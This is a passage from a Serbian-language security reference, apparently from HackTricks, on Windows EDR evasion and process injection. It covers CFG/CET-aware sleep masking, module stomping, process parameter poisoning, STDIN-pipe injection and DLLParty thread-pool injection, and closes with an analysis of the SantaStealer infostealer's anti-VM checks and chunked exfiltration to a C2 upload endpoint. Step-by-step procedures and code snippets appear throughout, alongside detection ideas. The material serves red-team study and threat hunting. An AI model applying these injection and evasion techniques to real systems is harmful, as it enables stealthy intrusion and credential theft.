Na ciljevima sa omogućenim CFG-om, prvi indirektni skok u gadget usred funkcije, kao što su `jmp [rbx]` ili `jmp rdi`, obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metapodacima modula. Da bi Ekko/Kraken-style lanci funkcionisali u ojačanim procesima:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje lanac koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i stavki `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-a (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **bazi image-a** i da obuhvata **punu veličinu image-a**.
- Za ručno mapirane/PIC/stomped oblasti koristi **bazu alokacije** i njenu veličinu.
- Označi ne samo dispatch gadget već i export-e do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall-ovi), kao i izvršne sekcije pod kontrolom napadača koje će postati indirektna odredišta.

Ovim se ROP/JOP-style sleep lanci pretvaraju iz primitiva koji „radi samo u procesima bez CFG-a“ u ponovo upotrebljiv mehanizam za `explorer.exe`, browsere, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-bezbedan stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a stvara mnogo šuma i može da otkaže na sistemima sa CET Shadow Stack-om jer spoofovani `Rip` i dalje mora da odgovara hardverskom shadow stack-u. Bezbedniji obrazac za maskiranje tokom spavanja je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj granice njegovog steka u `NT_TIB` / TEB-u (`StackBase`, `StackLimit`) pomoću `NtQueryInformationThread`.
- Sačuvaj trenutni stvarni TEB/TIB threada.
- Snimi stvarni kontekst uspavanog threada pomoću `GetThreadContext`.
- Kopiraj **samo** stvarni `Rip` u spoof kontekst, a spoofovani `Rsp`/stanje steka ostavi neizmenjene.
- Tokom perioda spavanja kopiraj `NT_TIB` spoof threada u TEB trenutnog threada kako bi stack walker-i odmotavali stek unutar legitimnog opsega.
- Po završetku čekanja vrati originalni TIB i kontekst threada.

Time se zadržava `Rip` usklađen sa CET-om, a EDR stack walker-i koji se oslanjaju na metapodatke steka u TEB-u da bi proverili odmotavanje steka bivaju dovedeni u zabludu.

### APC alternativa: Kraken Mask

Ako je timer-queue dispatch prepoznatljiv po potpisu, isti niz sleep-encrypt-spoof-restore može da se izvrši iz suspendovanog pomoćnog threada pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Kreiraj pomoćni thread sa `NtTestAlert` kao ulaznom tačkom.
- Stavi pripremljene `CONTEXT` frejmove/APC-ove u red pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Stanje lanca čuvaj na heap-u, a ne na steku pomoćnog threada, kako bi se izbeglo iscrpljivanje podrazumevanog steka od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da atomarno signaliziraš start event i blokiraš se.
- Suspenduj glavni thread pre vraćanja TIB-a/konteksta (`NtSuspendThread` → vraćanje → `NtResumeThread`) da bi se smanjio vremenski prozor u kom skener može da uhvati delimično vraćen stek.

Ovim se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom pomoćnog threada/APC-a, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko poziva `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- Poziv `NtQueryInformationThread` posle kog slede direktni upisi u granice steka u TEB/TIB-u trenutnog threada.
- Lanci `NtQueueApcThread`/`NtAlertResumeThread` koji indirektno stižu do `SystemFunction032`, `VirtualProtect` ili pomoćnih funkcija za vraćanje dozvola sekcija.
- Ponovljena upotreba kratkih gadget potpisa kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivoti unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload-e iz **`.text` sekcije DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu izvršnu memoriju ili učitava novi žrtveni DLL. Cilj za prepisivanje treba da bude **učitan image podržan diskom** čiji kodni prostor može da primi payload, a da pritom ne ošteti putanje koda koje su i dalje potrebne procesu.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivan stomping uobičajenih modula kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljenom procesu, a premala kodna oblast može da sruši proces. Pouzdaniji postupak je:

1. Izlistaj module ciljnog procesa i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo izgradi payload i zabeleži njegovу **tačnu veličinu u bajtovima**.
3. Skeniraj DLL-ove na disku i uporedi PE sekcije **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu izvršne sekcije **nakon mapiranja u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni pomak za stomp.
5. Izračunaj **blast radius**: ako je payload veći od granice izabrane funkcije, prepisaće susedne export-e koji slede za njom u memoriji.

Uobičajeni pomoćni alati za izviđanje/izbor koji se viđaju u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Prednost dajte DLL-ovima koji su **već učitani** u udaljenom procesu da biste izbegli telemetriju koju stvaraju `LoadLibrary`/neočekivana učitavanja image-a.
- Prednost dajte export-ovima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni tokovi izvršavanja mogu naići na izmenjene bajtove pre ili posle kreiranja threada.
- Za velike implantate često je potrebno promeniti način ugradnje shellcode-a: umesto string literala koristite **byte-array/braced initializer** kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice podržane image-om** (`MEM_IMAGE`, `PAGE_EXECUTE*`), umesto u češće privatne RWX/RX alokacije.
- Entry point-ovi export-a čiji se bajtovi u memoriji više ne poklapaju sa odgovarajućim fajlom na disku.
- Udaljeni thread-ovi ili context pivot-i koji započinju izvršavanje unutar legitimnog DLL export-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **process-injection / EDR-evasion** koja zaobilazi klasični remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenut ciljni proces, zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre `CreateProcessW` u child proces** i skladišti ih u `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosnici koje `CreateProcessW` može da otruje i kopira

Korisni prenosnici su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (uz `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja prenosnika:

- `lpCommandLine` mora da pokazuje na **memoriju u koju može da se upisuje** za `CreateProcessW`, a ograničen je na **32.767 Unicode znakova**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block sa uzastopnim stringovima oblika `NAME=VALUE\0`, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba posmatrati kao pojedinost implementacije, a ne kao stabilan, dokumentovan ugovor.

Time se uobičajeno kreiranje procesa pretvara u **payload-transfer primitive**. Operator kreira child proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez remote write API-ja

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću **primitiva samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobijte `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite odabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršni. Uobičajeni P3 lanac je:

1. Kreirajte proces na uobičajen način (ne suspendovan)
2. Omogućite izvršavanje na izabranoj stranici parametara pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebite handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmerite izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepišite `RIP`)

Za razliku od klasičnih postupaka preuzimanja kontrole nad niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može direktno promeniti pomoću vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadziru zbog injektovanja:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje nultog bajta i pripremni shellcode

Sva tri nosača su **stringovi ili podaci nalik stringovima**, pa se sirovi payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva faza bez nultih bajtova**, koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da napravi stringove na steku, argumente API-ja, putanje do DLL-ova ili učitavač shellcode-a druge faze, a da u transportovanom parametru ne ugradi null bajtove.

### Pozivi API-ja zasnovani na steku iz prve faze

Kada prva faza mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi poravnanje `RSP` na **16 bajtova** pre poziva

Druga faza zatim može da se kopira sa steka u alokaciju `PAGE_READWRITE`, čija se zaštita promeni u `PAGE_EXECUTE_READ` pomoću `VirtualProtect`, pa se izvršavanje preusmeri na nju, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za threat hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kojima se stranice parametara procesa postavljaju kao izvršne
- nakon te promene zaštite sledi `SetThreadContext` / `NtSetContextThread`
- udaljeno čitanje `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neobično dugačke vrednosti ili vrednosti velike entropije za `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` pri kreiranju procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalni mehanizam za izvršavanje: kopiranom parametru i dalje treba promeniti dozvole u izvršne i upotrebiti metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno koristi sumnjive primitive kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Injekcija kroz STDIN pipe konzole

Interaktivni konzolni child proces može da posluži i kao **primitiva za prenos payload-a**. Injector preusmerava standardni ulaz child procesa na pipe i šalje marker praćen shellcode-ом. Nakon što konzolni program pročita podatke u sopstvenu privatnu memoriju, injector pronalazi taj bafer, čini ga izvršnim i preusmerava nit child процеса ka njemu. Тако се избегавају `VirtualAllocEx` и `WriteProcessMemory`, али се и даље ради о process injection-у, а не о општем EDR bypass-у.<sup>[[41]](#references)</sup>

Упркос опису „named-pipe“, референтна имплементација позива `CreatePipe`, који прави **анонимни pipe**. Windows интерно имплементира анонимне pipe-ове помоћу јединствено именованих pipe објеката, али PoC не бира путању `\\.\pipe\<name>` нити позива `CreateNamedPipe`. Прави handle-ове који се могу наследити, са подразумеваним безбедносним дескриптором, смешта read handle у `STARTUPINFO.hStdInput`, поставља `STARTF_USESTDHANDLES` и покреће нови child процес са омогућеним наслеђивањем handle-ова. Зато овај PoC покреће наведени конзолни executable; не повезује pipe са већ постојећим процесом.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Референтни ток рада

Имплементација користи следећи низ корака:<sup>[[41]](#references)</sup>

1. Направи парове анонимних pipe-ова за `STDIN` и `STDOUT` child процеса. Онемогући наслеђивање на два handle-а на страни parent процеса и затвори дупликате handle-ова на страни child процеса у parent процесу након креирања процеса.
2. Покрени интерактивни executable, као што је `netsh.exe` или `nslookup.exe`, са `CREATE_NEW_CONSOLE`. Child наслеђује преусмерене стандардне handle-ове.
3. Пошаљи комплетан бинарни низ `rawData` помоћу `WriteFile` кроз handle за `STDIN` на страни parent процеса. Конзолни програм преузима бајтове и оставља копију у једном од својих приватних commit-ованих региона.
4. Прођи кроз адресни простор child процеса помоћу `VirtualQueryEx`, прочитај потенцијалне регионе `MEM_PRIVATE` помоћу `ReadProcessMemory` и потражи marker на почетку `rawData`.
5. Промени заштиту откривеног бафера у `PAGE_EXECUTE_READWRITE` помоћу `VirtualProtectEx`.
6. Идентификуј главну нит, суспендуј је, постави `RIP` на `found_address + 0x19` помоћу `NtSetContextThread` и настави њено извршавање.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija je specifična za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Prilikom zamene payload-a sačuvajte taj raspored ili zajedno ažurirajte marker, vektor za pretragu, veličinu niza i pomeraj izvršavanja. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao nedozvoljene znakove. Ovaj workflow ne menja token niti privilegije podređenog procesa.<sup>[[41]](#references)</sup>

Za male native pomoćne programe i obrasce za kompajliranje payload-a pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection pomoću thread-pool callback-a bez shellcode-a (DLLParty)

DLLParty prilagođava thread-pool injection u stilu PoolParty-ja tako da postojeći worker ciljnog procesa pozove `LoadLibraryA`, umesto da izvršava ubačeni callback stub. Njegov primitive za dispatch je `TP_DIRECT` completion koji se stavlja u red u I/O completion port ciljnog pool-a. Time se ne zaobilaze dozvole procesa: PoC poziva `OpenProcess(PROCESS_ALL_ACCESS)` i zahteva memoriju ciljnog procesa koja može da se čita i zapisuje, kao i handle-ове worker-factory и completion-port који могу да се дуплирају.<sup>[[46]](#references)[[47]](#references)</sup>

Na Windows x64, worker prosleđuje pokazivač na `TP_CALLBACK_INSTANCE` smešten na steku preko `RCX`, prvog argumenta callback-a. `LoadLibraryA` tumači isti pokazivač kao `LPCSTR`. Na testiranoj putanji, `TppWorkerThread` formira pokazivač na `RSP+0x178`, dok je prvo uobičajeno upisivanje u taj objekat na `RSP+0x1d0`. Zato putanja DLL-a završena nulom, koja staje u ovaj prefiks od 0x58 bajtova, može da se smesti na početak instance, a da ne bude prepisana pre dispatch-a. Ovo je zapažanje specifično za određenu verziju, a ne dokumentovana garancija Windows ABI-ja.<sup>[[46]](#references)[[47]](#references)</sup>

Referentni workflow je sledeći:<sup>[[46]](#references)[[47]](#references)</sup>

1. Nabrojte handle-ove ciljnog procesa pomoću `NtQuerySystemInformation(SystemHandleInformation)` i identifikujte `TpWorkerFactory` tako što ćete proveriti tipove objekata. Duplicirajte handle worker-factory-ja i zatražite `WorkerFactoryBasicInformation`; `StartParameter` daje udaljeni `TP_POOL`. Preskočite factory-је čiji је `TotalWorkerCount == 0`.
2. Pročitajte `TP_POOL.CompletionPort` i prođite kroz privatnu listu worker-a u pool-u. Na testiranoj x64 verziji Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), glava liste nalazi se na `pool+0x60`; svaka veza je na `worker+0x10`, pa je slot callback-instance na `worker+0x38` jednak `link+0x28`. PoC proverava poravnanje pokazivača, uzajamne veze, vlasništvo nad pool-om, nenulte ID-jeve niti, ponovljene čvorove i stabilnost glave liste.
3. Upišite putanju DLL-a u **svaki** pronađeni worker slot jer bilo koji worker može preuzeti completion iz reda. Postavite `TP_DIRECT` sa `Callback = LoadLibraryA` u memoriju ciljnog procesa koja može da se zapisuje. PoC koristi `last_slot-0x500` na steku worker-a umesto `VirtualAllocEx`; taj pomeraj je eksperimentalan i ne sme da se preklapa sa aktivnim podacima steka.
4. Duplicirajte handle completion-port-a ciljnog procesa i pozovite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adresa udaljenog `TP_DIRECT` objekta je completion key. Postojeći worker zatim poziva `LoadLibraryA` koristeći prepisani pokazivač callback-instance, čime učitava DLL kojem ciljni proces već ima pristup.

PoC prima PID ciljnog procesa (`DLLParty.exe <target_pid>`) i koristi hard-kodiranu putanju DLL-a u `DLLParty.cpp`; pre izgradnje x64 izvršne datoteke podesite putanju kojoj ciljni proces može da pristupi. Takođe koristi adresu `LoadLibraryA` iz sopstvenog procesa kao udaljeni callback, pa pretpostavlja da ta adresa važi i u ciljnom procesu. Kod ne proverava da li je dužina putanje manja od prefiksa od 0x58 bajtova niti da li je obilazak worker-а pronašao slot pre indeksiranja poslednjeg elementa. Ponovo proverite privatne pomeraje, raspored steka i prostor za upis za ciljnu verziju. Izostavljanje `CreateRemoteThreadEx`, shellcode-а i `VirtualAllocEx` ne uklanja upise između procesa niti telemetriju učitavanja DLL-a.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer tehnike za izbegavanje detekcije bez fajlova i krađu kredencijala

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni info-stealer-i objedinjuju AV bypass, anti-analysis i pristup kredencijalima u jednom workflow-u.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak pravi praznu `CIS` oznaku i prekida rad pre pokretanja kradljivaca, čime sprečava aktiviranje u isključenim lokalizacijama, a pritom ostavlja artefakt za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenom rolling checksum funkcijom i upoređuje ga sa ugrađenim listama za blokiranje debugger-a/sandbox okruženja; ponavlja checksum nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalni broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox additions i obavlja vremenske provere oko pauza da bi uočila izvršavanje korak po korak. Svako poklapanje prekida izvršavanje pre pokretanja modula.

### Fileless pomoćni modul + dvostruko ChaCha20 reflective učitavanje

- Primarni DLL/EXE sadrži Chromium credential helper, koji se ili zapisuje na disk ili se ručno mapira u memoriju; u fileless režimu sam razrešava imports/relocations, tako da se ne zapisuju nikakvi pomoćni fajlovi.
- Taj helper čuva DLL drugog stepena, dvaput šifrovan ChaCha20 algoritmom (dva ključa od 32 bajta + 12-bajtni nonce-ovi). Nakon oba prolaza, blob se učitava reflective metodom (bez `LoadLibrary`) i pozivaju se exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedeni iz projekta [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste direct-syscall reflective process hollowing za ubacivanje u aktivan Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/kreditne kartice direktno iz SQLite baza podataka, uprkos ABE zaštiti.


### Modularno prikupljanje u memoriji i HTTP eksfiltracija u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača funkcija `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, browser ekstenzije itd.). Svaka nit upisuje rezultate u deljene baferе i prijavljuje broj fajlova nakon približno 45 sekundi čekanja na niti.
- Kada se postupak završi, sve se pakuje pomoću statički povezane biblioteke `miniz` u `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 sekundi i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažno predstavljajući browser `multipart/form-data` granicu (`----WebKitFormBoundary***`). Svaki deo sadrži `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji deo dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne taktike izbegavanja detekcije: precizno module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pozivi na steku: malware više ne prolazi besplatno](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje poziva na steku](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Da li treba verovati zero trust pristupu? Zaobilaženje Zscaler provera stanja uređaja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: istraživanje ranijih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: zloupotreba prosleđenih exports funkcija](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Popis prosleđenih exports funkcija u Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamički povezane biblioteke](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL pokretač](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz zaštitu koju pruža Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Probijanje zaštitne barijere Windows Defender-a tehnikom preusmeravanja fascikli](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – referenca za mklink komandu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza čiste zavese: od RAT-a do builder-a i programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: suzbijanje Node.js malware-a praćenjem API-ja](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: uspavljivanje Adaptix-a pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje Dotnet Etw-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u red team operacijama: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: pretvaranje Defender-ovog drajvera za sanaciju u primitivu za operacije na kernelu](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: izrada samomaskirajućih funkcija pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Izvorni kod za InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcija CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kreiranje podređenog procesa sa preusmerenim ulazom i izlazom](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: ponovno kovanje C# alata pomoću WasmForge-a](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kompajliranje C# / .NET projekata](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty dokaz koncepta i izvorni kod](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Zloupotreba internih mehanizama thread pool-a za DLL injection bez shellcode-a](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 skup podataka za benchmarking i thrember alati](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Korišćenje EMBER2024 za procenu red team implantata](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Izbegavanje detekcija zasnovanih na mašinskom učenju](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
